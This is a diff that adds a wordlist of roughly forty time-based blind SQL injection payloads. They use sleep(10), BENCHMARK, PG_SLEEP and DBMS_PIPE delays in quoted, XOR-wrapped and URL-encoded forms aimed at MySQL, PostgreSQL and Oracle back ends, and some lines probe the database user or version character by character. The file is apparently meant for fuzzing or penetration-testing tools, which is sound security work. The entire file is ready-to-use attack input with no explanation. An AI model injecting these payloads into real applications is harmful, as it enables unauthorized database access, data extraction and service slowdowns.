@@ -1,0 +1,41 @@
+'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z
+X'XOR(if(now()=sysdate(),//sleep(10)//,0))XOR'X
+X'XOR(if(now()=sysdate(),(sleep(10)),0))XOR'X
+X'XOR(if((select now()=sysdate()),BENCHMARK(10000000,md5('xyz')),0))XOR'X
+'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z
+(SELECT(0)FROM(SELECT(SLEEP(10)))a)
+'XOR(if(now()=sysdate(),sleep(10),0))OR'
+1 AND (SELECT(0)FROM(SELECT(SLEEP(10)))a)-- wXyW
+(SELECT * FROM (SELECT(SLEEP(10)))a)
+'%2b(select*from(select(sleep(10)))a)%2b'
+CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(10))END
+');(SELECT 4564 FROM PG_SLEEP(10))--
+["')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//5//%23"]
+DBMS_PIPE.RECEIVE_MESSAGE([INT],10) AND 'bar'='bar
+AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],10) AND 'bar'='bar
+1' AND (SELECT 6268 FROM (SELECT(SLEEP(10)))ghXo) AND 'IKlK'='IKlK
+(select*from(select(sleep(10)))a)
+'%2b(select*from(select(sleep(10)))a)%2b'
+*'XOR(if(2=2,sleep(10),0))OR'
+-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//
+'+(select*from(select(if(1=1,sleep(10),false)))a)+'
+2021 AND (SELECT 6868 FROM (SELECT(SLEEP(10)))IiOE)
+BENCHMARK(10000000,MD5(CHAR(116)))
+'%2bbenchmark(10000000,sha1(1))%2b'
+'%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(10),1)))a)--%20 - true
+if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"/
+if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0) and 1=1)"/
+0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(10*1),0))XOR'Z
+if(now()=sysdate(),sleep(10),0)
+'XOR(if(now()=sysdate(),sleep(10),0))XOR'
+'XOR(if(now()=sysdate(),sleep(10*1),0))OR'
+0'|(IF((now())LIKE(sysdate()),SLEEP(10),0))|'Z
+(select(0)from(select(sleep(10)))v)
+'%2b(select*from(select(sleep(10)))a)%2b'
+(select*from(select(sleep(10)))a)
+1'%2b(select*from(select(sleep(10)))a)%2b'
+,(select * from (select(sleep(10)))a)
+desc%2c(select*from(select(sleep(10)))a)
+-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(10))A))
